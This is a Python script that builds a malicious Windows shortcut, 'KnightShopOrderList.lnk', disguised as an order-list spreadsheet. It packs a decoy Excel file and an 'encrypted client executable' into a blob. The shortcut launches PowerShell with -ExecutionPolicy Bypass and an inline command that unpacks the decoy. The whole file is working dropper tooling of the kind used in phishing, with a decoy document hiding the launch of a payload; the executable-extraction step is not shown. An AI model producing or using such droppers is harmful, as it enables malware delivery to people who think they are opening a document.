import os
import sys
from win32com.client import Dispatch
from typing import List, Dict

def compress_powershell_script(script_content: str) -> str:
    """
    Compress the PowerShell script content into a single line
    while maintaining its original functionality.
    """
    lines = script_content.splitlines()

    # Remove lines starting with `#` and strip extra whitespace
    code_lines = [line.strip() for line in lines if not line.strip().startswith("#")]
    code_lines = list(filter(None, code_lines))

    # Combine lines intelligently
    # If a line already ends with ';', do not add another
    oneliner = []
    for line in code_lines:
        if line.endswith(";"):
            oneliner.append(line)
        else:
            oneliner.append(line + ";")

    # Join all parts into a single line, ensuring proper spacing
    return " ".join(oneliner)

def create_dummy_data_file(data_paths: List[str], output_path: str) -> Dict[str, int]:
    """
    Create a dummy data file that stores arbitrary data in the specified paths.
    Concatenates the contents of the files listed in data_paths and writes to output_path.
    Returns a dictionary of offsets in bytes for each file in the output file.
    """
    offsets = {}
    current_offset = 0

    try:
        with open(output_path, "wb") as f:
            for data_path in data_paths:
                abs_data_path = os.path.abspath(data_path)
                if not os.path.isfile(abs_data_path):
                    print(f"Warning: {abs_data_path} does not exist and will be skipped.")
                    continue
                with open(abs_data_path, "rb") as data_file:
                    print(f"Writing {abs_data_path} to {output_path} at offset {current_offset}")
                    offsets[data_path] = current_offset
                    data = data_file.read()
                    f.write(data)
                    current_offset += len(data)
    except Exception as e:
        print(f"Error while creating dummy data file: {e}")
        sys.exit(1)

    return offsets

def create_lnk_shortcut(shortcut_path: str, target_path: str, arguments: str = '',
                        working_directory: str = '', icon_path: str = ''):
    """
    Creates a Windows shortcut (.lnk file).

    :param shortcut_path: Full path where the shortcut will be created.
    :param target_path: The executable or script the shortcut points to.
    :param arguments: Command-line arguments for the target.
    :param working_directory: The working directory for the shortcut.
    :param icon_path: Path to the icon file for the shortcut.
    """
    try:
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = target_path
        shortcut.Arguments = arguments
        shortcut.WorkingDirectory = working_directory if working_directory else os.path.dirname(target_path)
        if icon_path:
            shortcut.IconLocation = icon_path
        shortcut.save()
        print(f"Shortcut created at: {shortcut_path}")
    except Exception as e:
        print(f"Failed to create shortcut: {e}")
        sys.exit(1)

def get_powershell_path() -> str:
    """
    Retrieves the path to the PowerShell executable.
    """
    system_root = os.environ.get('SystemRoot', 'C:\\Windows')
    potential_paths = [
        os.path.join(system_root, 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe'),
        os.path.join(system_root, 'SysWOW64', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
    ]
    for path in potential_paths:
        if os.path.isfile(path):
            return path
    print("PowerShell executable not found.")
    sys.exit(1)

if __name__ == "__main__":
    # Define data paths (use absolute paths for reliability)
    data_paths = [
        os.path.abspath("../asset/KnightShopOrderList.xlsx"),      # Benign Excel file
        os.path.abspath("../../client/dist/client_encrypted.exe")  # Encrypted client executable
    ]
    output_path = os.path.abspath("dummy_data.bin")
    offsets = create_dummy_data_file(data_paths, output_path)

    # Ensure that the required files were written
    if not os.path.isfile(output_path):
        print(f"Error: {output_path} was not created.")
        sys.exit(1)

    # Injected PowerShell Script Content
    ps1_content = f"""
if (-not (Test-Path "$env:Public\\Downloads")) {{
    New-Item -Path "$env:Public" -Name "Downloads" -ItemType "directory"
}}

# Get the script's directory
$scriptPath = Get-Location
Write-Host "Script path: $scriptPath"

# Check if input file exists
$filePath = Join-Path $scriptPath "{os.path.basename(output_path)}"
if (-not (Test-Path $filePath)) {{
    Write-Host "Error: File not found at $filePath" -ForegroundColor Red
    exit -1
}}

# Open the binary file for reading
$fs = [System.IO.File]::OpenRead($filePath)
$br = New-Object System.IO.BinaryReader($fs)

# First file is the Excel sheet
$excel_path = Join-Path $scriptPath "outputfromdummy.xlsx"
$data = $br.ReadBytes({offsets.get(data_paths[1], 0)})
Write-Host "Data length read: $($data.Length)"
if ($data.Length -eq 0) {{
    Write-Host "Error: No data read from the file." -ForegroundColor Red
    exit -1
}}

# Write the Excel file
[System.IO.File]::WriteAllBytes($excel_path, $data)
Write-Host "Excel file saved to: $excel_path"

# Close file handles
$br.Close()
$fs.Close()
"""

    # Compress the PowerShell script
    compressed_ps1 = compress_powershell_script(ps1_content)

    # Create the lnk shortcut file
    try:
        current_directory = os.path.dirname(os.path.abspath(__file__))
    except NameError:
        current_directory = os.getcwd()

    shortcut_name = "KnightShopOrderList.lnk"
    shortcut_path = os.path.join(current_directory, shortcut_name)
    powershell_path = get_powershell_path()
    arguments = f'-ExecutionPolicy Bypass -NoExit -Command "{compressed_ps1}"'
    working_directory = current_directory  # Changed from os.path.expanduser("~")
    icon_path = powershell_path  # Optionally, you can set a custom icon

    # Create the lnk file shortcut
    create_lnk_shortcut(
        shortcut_path=shortcut_path,
        target_path=powershell_path,
        arguments=arguments,
        working_directory=working_directory,  # Updated
        icon_path=icon_path
    )